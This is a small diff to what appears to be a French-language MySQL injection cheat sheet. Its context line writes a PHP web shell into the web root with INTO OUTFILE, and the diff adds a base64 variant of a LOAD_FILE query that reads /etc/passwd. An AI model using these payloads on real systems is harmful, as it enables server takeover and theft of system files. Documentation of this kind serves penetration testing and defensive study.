@@ -56,4 +56,6 @@ mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html
 ```
 -- Ne fonctionne pas sur une in stallation par défaut
 select LOAD_FILE("/etc/passwd");
+select TO_BASE64(LOAD_FILE("/etc/passwd"));
+
 ```
